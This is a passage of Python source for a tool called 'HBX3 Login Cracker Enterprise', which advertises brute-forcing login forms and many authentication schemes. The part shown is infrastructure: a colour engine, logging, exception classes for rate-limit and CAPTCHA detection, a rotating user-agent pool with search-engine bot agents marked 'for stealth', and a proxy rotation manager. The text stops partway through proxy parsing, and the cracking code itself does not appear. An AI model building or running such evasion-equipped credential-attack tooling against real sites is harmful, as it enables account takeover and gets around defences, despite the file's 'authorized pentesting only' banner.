#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                            ║
║   ██╗  ██╗██████╗ ██╗  ██╗██████╗    ██╗      ██████╗  ██████╗ ██╗███╗  ██╗║
║   ██║  ██║██╔══██╗╚██╗██╔╝╚════██╗  ██║     ██╔═══██╗██╔════╝ ██║████╗ ██║║
║   ███████║██████╔╝ ╚███╔╝  █████╔╝  ██║     ██║   ██║██║  ██╗ ██║██╔██╗██║║
║   ██╔══██║██╔══██╗ ██╔██╗  ╚═══██╗  ██║     ██║   ██║██║  ╚██╗██║██║╚████║║
║   ██║  ██║██████╔╝██╔╝ ██╗██████╔╝  ███████╗╚██████╔╝╚██████╔╝██║██║ ╚███║║
║   ╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝╚═════╝   ╚══════╝ ╚═════╝  ╚═════╝ ╚═╝╚═╝  ╚══╝║
║                                                                            ║
║   ██████╗ ██████╗  █████╗  ██████╗██╗  ██╗███████╗██████╗                 ║
║   ██╔══██╗██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗                ║
║   ██████╔╝██████╔╝███████║██║     █████╔╝ █████╗  ██████╔╝                ║
║   ██╔══██╗██╔══██╗██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗                ║
║   ██║  ██║██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║                ║
║   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝                ║
║                                                                            ║
║   Login Cracker Enterprise v4.5                                            ║
║   Form Detection : ALL Levels                                              ║
║   Auth Methods   : Form · JSON · Basic · Digest · NTLM · OAuth · JWT      ║
║   Frameworks     : All CMS · All Frameworks · Custom                       ║
║                                                                            ║
║   Authorized Penetration Testing Tool                                      ║
║   Unauthorized use is prohibited                                           ║
║                                                                            ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""


import os
import re
import sys
import json
import csv
import time
import math
import random
import base64
import hashlib
import logging
import binascii
import argparse
import traceback
import textwrap
from enum import Enum
from threading import Lock, Semaphore, Thread
from queue import Queue, Empty
from dataclasses import dataclass, field, asdict
from datetime import datetime, timedelta
from typing import List, Dict, Optional, Tuple, Set, Callable, Any, Union
from collections import defaultdict, Counter, deque
from concurrent.futures import ThreadPoolExecutor, as_completed, wait, FIRST_COMPLETED
from urllib.parse import urljoin, urlparse, urlencode, parse_qs, quote, unquote
from io import StringIO
import xml.etree.ElementTree as ET

try:
    import requests
    from bs4 import BeautifulSoup
    HAVE_BS4 = True
except ImportError:
    HAVE_BS4 = False

try:
    import lxml
    HAVE_LXML = True
except ImportError:
    HAVE_LXML = False

try:
    import jwt as pyjwt
    HAVE_JWT = True
except ImportError:
    HAVE_JWT = False

try:
    from requests_ntlm import HttpNtlmAuth
    HAVE_NTLM = True
except ImportError:
    HAVE_NTLM = False

try:
    import re as regex
    HAVE_REGEX = True
except ImportError:
    HAVE_REGEX = False


# ═════════════════════════════════════════════════════════════════════════════
# COLOR ENGINE
# ═════════════════════════════════════════════════════════════════════════════

class ColorEngine:
    """
    Terminal color and styling engine.
    Supports 16M colors (true color), 256 colors, and basic ANSI.
    Detects terminal capability automatically.
    """

    _instance = None
    _supports_color = True
    _true_color = True

    # Base colors
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'

    # Bright variants
    BRIGHT_BLACK = '\033[90m'
    BRIGHT_RED = '\033[91m'
    BRIGHT_GREEN = '\033[92m'
    BRIGHT_YELLOW = '\033[93m'
    BRIGHT_BLUE = '\033[94m'
    BRIGHT_MAGENTA = '\033[95m'
    BRIGHT_CYAN = '\033[96m'
    BRIGHT_WHITE = '\033[97m'

    # Styles
    BOLD = '\033[1m'
    DIM = '\033[2m'
    ITALIC = '\033[3m'
    UNDERLINE = '\033[4m'
    BLINK = '\033[5m'
    REVERSE = '\033[7m'
    HIDDEN = '\033[8m'
    STRIKE = '\033[9m'

    # 256 colors (XTerm)
    ORANGE = '\033[38;5;214m'
    PINK = '\033[38;5;205m'
    PURPLE = '\033[38;5;135m'
    GOLD = '\033[38;5;220m'
    LIME = '\033[38;5;154m'
    TEAL = '\033[38;5;37m'
    CORAL = '\033[38;5;209m'
    INDIGO = '\033[38;5;54m'
    SKY_BLUE = '\033[38;5;117m'
    HOT_PINK = '\033[38;5;198m'
    DARK_GREEN = '\033[38;5;22m'
    DARK_RED = '\033[38;5;52m'
    DARK_BLUE = '\033[38;5;17m'
    GRAY = '\033[38;5;244m'
    LIGHT_GRAY = '\033[38;5;250m'

    RESET_ALL = '\033[0m'
    RESET_FG = '\033[39m'
    RESET_BG = '\033[49m'
    RESET_BOLD = '\033[22m'
    RESET_UNDERLINE = '\033[24m'

    # Backgrounds
    BG_RED = '\033[41m'
    BG_GREEN = '\033[42m'
    BG_YELLOW = '\033[43m'
    BG_BLUE = '\033[44m'
    BG_MAGENTA = '\033[45m'
    BG_CYAN = '\033[46m'
    BG_WHITE = '\033[47m'
    BG_BRIGHT_RED = '\033[101m'
    BG_BRIGHT_GREEN = '\033[102m'
    BG_BRIGHT_YELLOW = '\033[103m'
    BG_BRIGHT_BLUE = '\033[104m'
    BG_BLACK = '\033[40m'

    _rainbow_colors = [
        '\033[38;5;196m', '\033[38;5;208m', '\033[38;5;226m',
        '\033[38;5;46m', '\033[38;5;39m', '\033[38;5;93m',
        '\033[38;5;201m',
    ]

    _fire_colors = [
        '\033[38;5;196m', '\033[38;5;202m', '\033[38;5;208m',
        '\033[38;5;214m', '\033[38;5;220m', '\033[38;5;226m',
    ]

    _ocean_colors = [
        '\033[38;5;17m', '\033[38;5;18m', '\033[38;5;19m',
        '\033[38;5;20m', '\033[38;5;21m', '\033[38;5;33m',
        '\033[38;5;39m', '\033[38;5;45m', '\033[38;5;51m',
    ]

    _neon_colors = [
        '\033[38;5;46m', '\033[38;5;82m', '\033[38;5;118m',
        '\033[38;5;154m', '\033[38;5;190m', '\033[38;5;226m',
    ]

    def __new__(cls):
        if cls._instance is None:
            cls._instance = super().__new__(cls)
            cls._detect_capabilities()
        return cls._instance

    @classmethod
    def _detect_capabilities(cls):
        """Detect terminal color capabilities."""
        if not sys.stdout.isatty():
            cls._supports_color = False
            cls._true_color = False
            return

        term = os.environ.get('TERM', '')
        if 'truecolor' in term or '24bit' in term:
            cls._true_color = True
        elif '256' in term:
            cls._true_color = False
        elif os.environ.get('COLORTERM') in ('truecolor', '24bit'):
            cls._true_color = True
        elif os.environ.get('FORCE_COLOR'):
            cls._supports_color = True
            cls._true_color = True
        else:
            cls._true_color = False

    @classmethod
    def disable_color(cls):
        """Disable all color output."""
        cls._supports_color = False

    @classmethod
    def enable_color(cls):
        """Enable color output."""
        cls._supports_color = True

    @classmethod
    def strip_color(cls, text: str) -> str:
        """Remove all ANSI escape sequences from text."""
        ansi_pattern = re.compile(r'\033\[[0-9;]*m')
        return ansi_pattern.sub('', text)

    @classmethod
    def wrap(cls, text: str, *codes: str) -> str:
        """Wrap text in color codes."""
        if not cls._supports_color:
            return text
        if not codes:
            return text
        prefix = ''.join(codes)
        suffix = cls.RESET_ALL
        return f"{prefix}{text}{suffix}"

    @classmethod
    def red(cls, text: str) -> str:
        return cls.wrap(text, cls.RED)

    @classmethod
    def green(cls, text: str) -> str:
        return cls.wrap(text, cls.GREEN)

    @classmethod
    def yellow(cls, text: str) -> str:
        return cls.wrap(text, cls.YELLOW)

    @classmethod
    def blue(cls, text: str) -> str:
        return cls.wrap(text, cls.BLUE)

    @classmethod
    def magenta(cls, text: str) -> str:
        return cls.wrap(text, cls.MAGENTA)

    @classmethod
    def cyan(cls, text: str) -> str:
        return cls.wrap(text, cls.CYAN)

    @classmethod
    def white(cls, text: str) -> str:
        return cls.wrap(text, cls.WHITE)

    @classmethod
    def orange(cls, text: str) -> str:
        return cls.wrap(text, cls.ORANGE)

    @classmethod
    def pink(cls, text: str) -> str:
        return cls.wrap(text, cls.PINK)

    @classmethod
    def gold(cls, text: str) -> str:
        return cls.wrap(text, cls.GOLD)

    @classmethod
    def bold(cls, text: str) -> str:
        return cls.wrap(text, cls.BOLD)

    @classmethod
    def dim(cls, text: str) -> str:
        return cls.wrap(text, cls.DIM)

    @classmethod
    def underline(cls, text: str) -> str:
        return cls.wrap(text, cls.UNDERLINE)

    @classmethod
    def italic(cls, text: str) -> str:
        return cls.wrap(text, cls.ITALIC)

    @classmethod
    def blink(cls, text: str) -> str:
        return cls.wrap(text, cls.BLINK)

    @classmethod
    def reverse(cls, text: str) -> str:
        return cls.wrap(text, cls.REVERSE)

    @classmethod
    def rainbow(cls, text: str) -> str:
        """Apply rainbow gradient to text."""
        if not cls._supports_color:
            return text
        result = []
        for i, ch in enumerate(text):
            color = cls._rainbow_colors[i % len(cls._rainbow_colors)]
            result.append(f"{color}{ch}{cls.RESET_ALL}")
        return ''.join(result)

    @classmethod
    def fire(cls, text: str) -> str:
        """Apply fire gradient to text."""
        if not cls._supports_color:
            return text
        result = []
        for i, ch in enumerate(text):
            color = cls._fire_colors[i % len(cls._fire_colors)]
            result.append(f"{color}{ch}{cls.RESET_ALL}")
        return ''.join(result)

    @classmethod
    def ocean(cls, text: str) -> str:
        """Apply ocean gradient to text."""
        if not cls._supports_color:
            return text
        result = []
        for i, ch in enumerate(text):
            color = cls._ocean_colors[i % len(cls._ocean_colors)]
            result.append(f"{color}{ch}{cls.RESET_ALL}")
        return ''.join(result)

    @classmethod
    def neon(cls, text: str) -> str:
        """Apply neon gradient to text."""
        if not cls._supports_color:
            return text
        result = []
        for i, ch in enumerate(text):
            color = cls._neon_colors[i % len(cls._neon_colors)]
            result.append(f"{color}{ch}{cls.RESET_ALL}")
        return ''.join(result)

    @classmethod
    def status_ok(cls, text: str) -> str:
        return cls.green(cls.bold(f"✓ {text}"))

    @classmethod
    def status_fail(cls, text: str) -> str:
        return cls.red(cls.bold(f"✗ {text}"))

    @classmethod
    def status_warn(cls, text: str) -> str:
        return cls.yellow(cls.bold(f"⚠ {text}"))

    @classmethod
    def status_info(cls, text: str) -> str:
        return cls.blue(cls.bold(f"ℹ {text}"))

    @classmethod
    def boxify(cls, text: str, width: int = 70, color: str = None) -> str:
        """Draw a box around text."""
        if color is None:
            color = cls.CYAN
        border = f"{color}{'═' * width}{cls.RESET_ALL}"
        lines = text.split('\n')
        result = [border]
        for line in lines:
            stripped = cls.strip_color(line)
            padding = width - len(stripped) - 2
            if padding < 0:
                padding = 0
            result.append(f"{color}║{cls.RESET_ALL} {line}{' ' * padding} {color}║{cls.RESET_ALL}")
        result.append(border)
        return '\n'.join(result)

    @classmethod
    def progress_bar(cls, current: int, total: int, width: int = 30,
                     color_done: str = None, color_left: str = None) -> str:
        """Draw a progress bar."""
        if color_done is None:
            color_done = cls.GREEN
        if color_left is None:
            color_left = cls.DIM

        if total == 0:
            return f"[{color_left}{'░' * width}{cls.RESET_ALL}]"

        ratio = current / total
        done = int(ratio * width)
        left = width - done

        bar = f"{color_done}{'█' * done}{cls.RESET_ALL}{color_left}{'░' * left}{cls.RESET_ALL}"
        pct = f"{cls.bold(f'{ratio * 100:.1f}%')}"
        return f"[{bar}] {pct}"

    @classmethod
    def true_color(cls, r: int, g: int, b: int, text: str, bold: bool = False) -> str:
        """True color (24-bit) output."""
        if not cls._supports_color or not cls._true_color:
            return text
        style = cls.BOLD if bold else ''
        return f"\033[38;2;{r};{g};{b}m{style}{text}{cls.RESET_ALL}"

    @classmethod
    def print_banner(cls):
        """Print the main HBX3 banner."""
        banner = f"""
{cls.RED}╔══════════════════════════════════════════════════════════════════════════════╗{cls.RESET_ALL}
{cls.YELLOW}║{cls.RESET_ALL}  {cls.CYAN}{cls.BOLD}██╗  ██╗██████╗ ██╗  ██╗██████╗{cls.RESET_ALL}    {cls.BRIGHT_CYAN}{cls.BOLD}Login Cracker Enterprise v4.5{cls.RESET_ALL}     {cls.YELLOW}║{cls.RESET_ALL}
{cls.YELLOW}║{cls.RESET_ALL}  {cls.CYAN}{cls.BOLD}██║  ██║██╔══██╗╚██╗██╔╝╚════██╗{cls.RESET_ALL}  {cls.GOLD}{cls.BOLD}╔═══╗╔══╗╔═══╗╔═══╗{cls.RESET_ALL}    {cls.YELLOW}║{cls.RESET_ALL}
{cls.YELLOW}║{cls.RESET_ALL}  {cls.CYAN}{cls.BOLD}███████║██████╔╝ ╚███╔╝  █████╔╝{cls.RESET_ALL}  {cls.GOLD}{cls.BOLD}║ HB║║ X ║║ B ║║ 3 ║{cls.RESET_ALL}    {cls.YELLOW}║{cls.RESET_ALL}
{cls.YELLOW}║{cls.RESET_ALL}  {cls.CYAN}{cls.BOLD}██╔══██║██╔══██╗ ██╔██╗  ╚═══██╗{cls.RESET_ALL}  {cls.GOLD}{cls.BOLD}╚═══╝╚══╝╚═══╝╚═══╝{cls.RESET_ALL}    {cls.YELLOW}║{cls.RESET_ALL}
{cls.YELLOW}║{cls.RESET_ALL}  {cls.CYAN}{cls.BOLD}██║  ██║██████╔╝██╔╝ ██╗██████╔╝{cls.RESET_ALL}                            {cls.YELLOW}║{cls.RESET_ALL}
{cls.YELLOW}║{cls.RESET_ALL}  {cls.CYAN}{cls.BOLD}╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝╚═════╝ {cls.RESET_ALL}                            {cls.YELLOW}║{cls.RESET_ALL}
{cls.YELLOW}║{cls.RESET_ALL}                                                                  {cls.YELLOW}║{cls.RESET_ALL}
{cls.BRIGHT_YELLOW}║{cls.RESET_ALL}  {cls.BRIGHT_MAGENTA}═══ Form Detection ∞ Level ═══{cls.RESET_ALL}  {cls.PINK}All Frameworks · All CMS · All Custom{cls.RESET_ALL}  {cls.BRIGHT_YELLOW}║{cls.RESET_ALL}
{cls.BRIGHT_YELLOW}║{cls.RESET_ALL}  {cls.BRIGHT_GREEN}═══ Auth: Form · JSON · Basic · Digest · NTLM · OAuth ═══{cls.RESET_ALL}  {cls.BRIGHT_YELLOW}║{cls.RESET_ALL}
{cls.RED}╚══════════════════════════════════════════════════════════════════════════════╝{cls.RESET_ALL}
{cls.rainbow('─' * 74)}{cls.RESET_ALL}
{cls.dim(f'  Started : {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}')}
{cls.dim('  Author  : HBX3 · Authorized Pentesting Only')}
{cls.rainbow('─' * 74)}{cls.RESET_ALL}
        """
        print(banner)


# Global color instance
C = ColorEngine()


# ═════════════════════════════════════════════════════════════════════════════
# LOGGING ENGINE
# ═════════════════════════════════════════════════════════════════════════════

class LogLevel(Enum):
    DEBUG = 10
    INFO = 20
    SUCCESS = 25
    WARNING = 30
    ERROR = 40
    CRITICAL = 50
    TRACE = 5
    PROGRESS = 15
    RESULT = 35
    NOTIFY = 45


class ColoredLogHandler(logging.Handler):
    """Custom logging handler with color-coded output."""

    LEVEL_COLORS = {
        LogLevel.TRACE.value: C.DIM,
        LogLevel.DEBUG.value: C.BRIGHT_BLACK,
        LogLevel.INFO.value: C.BRIGHT_CYAN,
        LogLevel.PROGRESS.value: C.GREEN,
        LogLevel.SUCCESS.value: C.BRIGHT_GREEN,
        LogLevel.WARNING.value: C.ORANGE,
        LogLevel.ERROR.value: C.BRIGHT_RED,
        LogLevel.RESULT.value: C.MAGENTA,
        LogLevel.CRITICAL.value: f"{C.RED}{C.BOLD}{C.REVERSE}",
        LogLevel.NOTIFY.value: C.PINK,
    }

    LEVEL_LABELS = {
        LogLevel.TRACE.value: "TRACE",
        LogLevel.DEBUG.value: "DEBUG",
        LogLevel.INFO.value: " * ",
        LogLevel.PROGRESS.value: ">>>",
        LogLevel.SUCCESS.value: " ✓ ",
        LogLevel.WARNING.value: " ⚠ ",
        LogLevel.ERROR.value: " ✗ ",
        LogLevel.RESULT.value: " ■ ",
        LogLevel.CRITICAL.value: " ☠ ",
        LogLevel.NOTIFY.value: " ☎ ",
    }

    def __init__(self, show_level=True, colorize=True):
        super().__init__()
        self.show_level = show_level
        self.colorize = colorize

    def emit(self, record):
        try:
            msg = self.format(record)
            if self.colorize:
                color = self.LEVEL_COLORS.get(record.levelno, C.RESET_ALL)
                label = self.LEVEL_LABELS.get(record.levelno, " ? ")
                if self.show_level:
                    msg = f"{color}{label}{C.RESET_ALL} {msg}"
                else:
                    msg = f"{color}{msg}{C.RESET_ALL}"
            print(msg, flush=True)
        except Exception:
            pass


class ProgressTracker:
    """Track and display progress for long-running operations."""

    def __init__(self, total: int, desc: str = "Progress",
                 width: int = 30, show_eta: bool = True):
        self.total = total
        self.desc = desc
        self.width = width
        self.show_eta = show_eta
        self.current = 0
        self.start_time = time.time()
        self.last_print = 0.0
        self.lock = Lock()
        self._finished = False

    def update(self, n: int = 1):
        with self.lock:
            self.current += n
            self._display()

    def set(self, n: int):
        with self.lock:
            self.current = min(n, self.total)
            self._display()

    def finish(self):
        with self.lock:
            self.current = self.total
            self._finished = True
            self._display(force=True)
            print()

    def _display(self, force: bool = False):
        now = time.time()
        if not force and now - self.last_print < 0.2:
            return
        self.last_print = now

        if self.total == 0:
            ratio = 0
        else:
            ratio = self.current / self.total

        done = int(ratio * self.width)
        left = self.width - done

        elapsed = now - self.start_time
        if self.current > 0 and self.show_eta and self.total > 0:
            rate = self.current / elapsed
            eta_secs = (self.total - self.current) / rate if rate > 0 else 0
            eta_str = str(timedelta(seconds=int(eta_secs)))
        else:
            eta_str = "?"

        elapsed_str = str(timedelta(seconds=int(elapsed)))
        bar = f"{C.GREEN}{'█' * done}{C.RESET_ALL}{C.DIM}{'░' * left}{C.RESET_ALL}"
        pct = f"{C.bold(f'{ratio * 100:5.1f}%')}"
        info = f"{C.dim(f'{self.current}/{self.total}')} {C.dim(f'[{elapsed_str}<{eta_str}]')}"

        sys.stdout.write(f"\r{C.CYAN}{self.desc}{C.RESET_ALL} [{bar}] {pct} {info}")
        sys.stdout.flush()


# ═════════════════════════════════════════════════════════════════════════════
# EXCEPTIONS
# ═════════════════════════════════════════════════════════════════════════════

class CrackerError(Exception):
    """Base exception for all cracker errors."""
    pass

class NetworkError(CrackerError):
    """Network-related errors (timeout, connection, etc.)."""
    pass

class FormDetectionError(CrackerError):
    """Failed to detect login form."""
    pass

class AuthenticationError(CrackerError):
    """Authentication-specific errors."""
    pass

class WordlistError(CrackerError):
    """Wordlist loading or processing errors."""
    pass

class ConfigurationError(CrackerError):
    """Invalid configuration."""
    pass

class RateLimitDetected(CrackerError):
    """Rate limiting or WAF detected."""
    pass

class CaptchaDetected(CrackerError):
    """CAPTCHA challenge detected."""
    pass


# ═════════════════════════════════════════════════════════════════════════════
# USER AGENT MANAGER
# ═════════════════════════════════════════════════════════════════════════════

class UserAgentManager:
    """
    Manages a large pool of realistic user agents.
    Rotates by category (mobile, desktop, tablet, bot) and browser.
    """

    _agents = [
        # Chrome (Desktop)
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",

        # Firefox (Desktop)
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.6; rv:127.0) Gecko/20100101 Firefox/127.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.5; rv:126.0) Gecko/20100101 Firefox/126.0",
        "Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",

        # Safari (Desktop)
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",

        # Edge (Desktop)
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",

        # Chrome (Android Mobile)
        "Mozilla/5.0 (Linux; Android 14; Pixel 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.165 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.165 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6422.165 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6422.165 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; OnePlus 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6422.165 Mobile Safari/537.36",

        # Safari (iOS Mobile)
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",

        # Samsung Internet
        "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/25.0 Chrome/125.0.6422.165 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/24.0 Chrome/124.0.6422.165 Mobile Safari/537.36",

        # Firefox (Mobile)
        "Mozilla/5.0 (Android 14; Mobile; rv:127.0) Gecko/127.0 Firefox/127.0",
        "Mozilla/5.0 (Android 13; Mobile; rv:126.0) Gecko/126.0 Firefox/126.0",

        # Legacy / SEO / Privacy
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    ]

    _categories = {
        "chrome_desktop": [i for i, a in enumerate(_agents) if "Chrome/" in a and "Mobile" not in a and "Edg/" not in a],
        "firefox_desktop": [i for i, a in enumerate(_agents) if "Firefox/" in a and "Mobile" not in a],
        "safari_desktop": [i for i, a in enumerate(_agents) if "Safari/" in a and "Chrome" not in a and "Mobile" not in a],
        "edge_desktop": [i for i, a in enumerate(_agents) if "Edg/" in a],
        "chrome_mobile": [i for i, a in enumerate(_agents) if "Chrome/" in a and "Mobile" in a and "SamsungBrowser" not in a],
        "safari_mobile": [i for i, a in enumerate(_agents) if "iPhone" in a or "iPad" in a],
        "samsung_mobile": [i for i, a in enumerate(_agents) if "SamsungBrowser" in a],
        "firefox_mobile": [i for i, a in enumerate(_agents) if "Firefox/" in a and "Mobile" in a],
    }

    def __init__(self):
        self._lock = Lock()
        self._counter = defaultdict(int)

    def get_random(self, category: str = None) -> str:
        """Get a random user agent, optionally from a specific category."""
        with self._lock:
            if category and category in self._categories:
                indices = self._categories[category]
                if not indices:
                    return random.choice(self._agents)
                idx = random.choice(indices)
                return self._agents[idx]
            return random.choice(self._agents)

    def get_rotated(self) -> str:
        """Get a user agent with round-robin rotation across categories."""
        cats = list(self._categories.keys())
        with self._lock:
            cat = cats[self._counter['cat'] % len(cats)]
            self._counter['cat'] += 1
            self._counter[cat] += 1
            indices = self._categories[cat]
            idx = indices[self._counter[cat] % len(indices)]
            return self._agents[idx]

    def get_mobile(self) -> str:
        """Get a mobile user agent."""
        return self.get_random(random.choice([
            "chrome_mobile", "safari_mobile", "samsung_mobile", "firefox_mobile"
        ]))

    def get_desktop(self) -> str:
        """Get a desktop user agent."""
        return self.get_random(random.choice([
            "chrome_desktop", "firefox_desktop", "safari_desktop", "edge_desktop"
        ]))

    @classmethod
    def get_common_bots(cls) -> List[str]:
        """Return common bot/crawler user agents (for stealth)."""
        return [
            "Googlebot/2.1 (+http://www.google.com/bot.html)",
            "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
            "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
            "Mozilla/5.0 (compatible; DuckDuckBot-Https/1.1; https://duckduckgo.com/duckduckbot)",
            "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
            "Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)",
            "TelegramBot (like TwitterBot)",
            "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
            "Twitterbot/1.0",
            "Discordbot/2.0; (+https://discordapp.com)",
        ]

    @classmethod
    def get_library_agents(cls) -> List[str]:
        """Return default library user agents (less stealthy)."""
        return [
            "python-requests/2.31.0",
            "Python/3.x aiohttp/3.9",
            "curl/8.7.1",
            "Wget/1.24.5",
            "HTTPie/3.2.2",
        ]


# ═════════════════════════════════════════════════════════════════════════════
# PROXY MANAGER
# ═════════════════════════════════════════════════════════════════════════════

class ProxyProtocol(Enum):
    HTTP = "http"
    HTTPS = "https"
    SOCKS4 = "socks4"
    SOCKS5 = "socks5"
    HTTP_HTTPS = "http+https"


@dataclass
class Proxy:
    address: str
    port: int
    protocol: ProxyProtocol = ProxyProtocol.HTTP
    username: Optional[str] = None
    password: Optional[str] = None
    region: Optional[str] = None
    is_alive: bool = True
    last_used: Optional[float] = None
    fail_count: int = 0
    response_time: float = 0.0

    @property
    def url(self) -> str:
        auth = ""
        if self.username and self.password:
            auth = f"{self.username}:{self.password}@"
        return f"{self.protocol.value}://{auth}{self.address}:{self.port}"

    @property
    def dict(self) -> Dict[str, str]:
        return {
            "http": self.url,
            "https": self.url,
        }


class ProxyManager:
    """
    Full-featured proxy manager with rotation, health checking,
    region filtering, and automatic failover.
    """

    def __init__(self, proxies: Optional[List[Proxy]] = None,
                 auto_verify: bool = True, max_fails: int = 3,
                 health_check_url: str = "https://httpbin.org/ip"):
        self._proxies = proxies or []
        self._alive = [p for p in self._proxies if p.is_alive]
        self._dead = [p for p in self._proxies if not p.is_alive]
        self._lock = Lock()
        self._index = 0
        self._auto_verify = auto_verify
        self._max_fails = max_fails
        self._health_check_url = health_check_url
        self._consecutive_no_proxy = 0

    @classmethod
    def from_file(cls, filepath: str) -> "ProxyManager":
        """Load proxies from a file (one per line)."""
        proxies = []
        try:
            with open(filepath, 'r') as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue
                    proxy = cls._parse_proxy_string(line)
                    if proxy:
                        proxies.append(proxy)
        except FileNotFoundError:
            logging.warning(f"{C.yellow('⚠ Proxy file not found:')} {filepath}")
        except Exception as e:
            logging.warning(f"{C.yellow('⚠ Error loading proxies:')} {e}")
        return cls(proxies)

    @classmethod
    def _parse_proxy_string(cls, s: str) -> Optional[Proxy]:
        """Parse proxy string into Proxy object."""
        s = s.strip()
        if not s:
            return None

        protocol = ProxyProtocol.HTTP
        username = None
        password = None
        address = None
        port = None

        # Parse protocol
        if s.startswith("socks5://"):
            protocol = ProxyProtocol.SOCKS5
            s = s[9:]
